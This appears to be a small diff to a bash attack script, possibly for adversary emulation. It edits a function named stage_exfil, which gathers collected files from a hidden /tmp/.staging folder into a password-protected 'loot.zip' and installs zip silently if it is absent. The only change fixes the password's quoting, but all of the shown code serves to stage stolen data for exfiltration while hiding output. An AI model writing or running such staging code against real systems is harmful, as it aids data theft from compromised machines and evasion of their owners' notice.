@@ -54,7 +54,7 @@ function discovery() {
 ############################################
 function stage_exfil() {
 echo -e "Compress and encrypt all collected data for exfil "
-Z1="zip --password "Hope" /tmp/.staging/loot.zip /tmp/.staging/* > /dev/null 2>&1"
+Z1="zip --password 'Hope' /tmp/.staging/loot.zip /tmp/.staging/* > /dev/null 2>&1"
 if [ ! -x "$(command -v zip)" ]; then apt install zip -y > /dev/null 2>&1; $Z1; else $Z1; fi;
 
 
